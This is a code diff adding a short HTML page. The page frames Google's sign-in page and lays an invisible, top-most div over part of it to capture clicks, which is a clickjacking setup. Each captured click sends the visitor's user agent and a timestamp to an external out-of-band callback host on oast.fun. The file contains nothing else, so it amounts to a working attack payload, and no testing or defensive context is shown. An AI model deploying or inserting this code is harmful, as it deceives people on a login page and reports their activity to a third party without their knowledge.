@@ -1,0 +1,15 @@
+<iframe src="https://accounts.google.com/signin" sandbox="allow-scripts allow-forms" width="100%" height="500" style="border:none;"></iframe>
+<div onclick="logClick()" style="position:fixed;top:100px;left:100px;width:200px;height:50px;z-index:9999;background:transparent;"></div>
+
+<script>
+function logClick() {
+  fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/login-click', {
+    method: 'POST',
+    body: JSON.stringify({
+      ua: navigator.userAgent,
+      timestamp: Date.now()
+    }),
+    headers: { 'Content-Type': 'application/json' }
+  });
+}
+</script>
